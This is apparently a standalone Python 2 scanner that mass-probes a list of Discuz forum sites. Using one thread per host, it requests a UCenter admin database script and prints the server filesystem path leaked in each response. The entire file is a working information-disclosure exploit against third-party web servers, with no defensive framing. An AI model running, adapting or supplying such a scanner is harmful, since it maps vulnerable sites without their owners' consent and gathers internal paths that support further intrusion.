#!/usr/bin/env python
# -*- coding: utf-8 -*-

import re
import re
import httplib
import thread
import threading
path = []
path.append("/api/addons/zendcheck.php")
path.append("/uc_server/control/admin/db.php")
def get_lines(file_name):
    f = open(file_name)
    return f.readlines()

def list_dir(site,path):
    site = site.strip()
    path = path.strip()
    conn = httplib.HTTPConnection(site,80,timeout=5)
    conn.request("GET",path)
    response = conn.getresponse()
    if response.status != 200:
        thread.exit_thread()
    data = response.read()
    m = re.search('/[a-zA-Z0-9\/_.]+', data)
    if m:
        print "%s %s" % (site,m.group())
    thread.exit_thread()

def main():
    sites = get_lines("discuz.txt")
    path = "/uc_server/control/admin/db.php"
    thread_list = []
    for i in sites:
        t = threading.Thread(target = list_dir, args = (i,path))
        thread_list.append(t)
    for t in thread_list:
        t.start()
    for t in thread_list:
        t.join()

if __name__ == '__main__':
    main()        
